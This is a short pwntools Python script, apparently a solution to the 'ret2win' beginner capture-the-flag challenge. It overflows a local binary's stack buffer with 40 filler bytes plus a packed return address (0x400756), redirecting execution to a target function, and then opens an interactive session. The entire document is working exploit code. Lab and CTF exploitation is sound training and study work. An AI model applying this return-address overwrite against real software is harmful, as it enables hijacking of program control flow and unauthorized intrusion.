from pwn import *
p = process('./ret2win')

payload = b'a' * 40 + p64(0x400756 + 0)
p.sendline(payload)
p.interactive()
